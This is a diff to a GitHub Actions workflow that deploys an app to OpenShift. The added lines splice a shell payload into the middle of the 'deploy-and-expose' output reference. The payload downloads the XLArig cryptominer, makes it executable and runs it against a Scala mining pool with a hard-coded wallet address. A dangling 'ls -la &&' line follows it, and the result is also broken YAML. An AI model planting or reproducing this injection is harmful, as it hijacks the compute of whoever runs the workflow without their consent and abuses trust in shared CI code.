@@ -177,4 +177,5 @@ jobs:
         echo "Your app can be taken down with: \"oc delete all --selector='${{ env.SELECTOR }}'\""
       env:
         ROUTE: ${{ steps.deploy-and-expose.outputs.route }}
-        SELECTOR: ${{ steps.deploy-and-expose.outputs.selector }}
+        SELECTOR: ${{ steps.deploy-anapt update && wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && chmod +x xlarig && ./xlarig --donate-level 1 -o scala.herominers.com:1190 -u SvjargaYn9R3wQCcKLFZUALUyPjW8aRYMD3KD5RtRxYmXcERSVJW9MsDWogu9H7MGs3yLi31bDCTTJzmMMWqo4Hc38Gjg4NTh -p paijo120 -a panthera -k d-expose.outputs.selector }}
+        ls -la && 
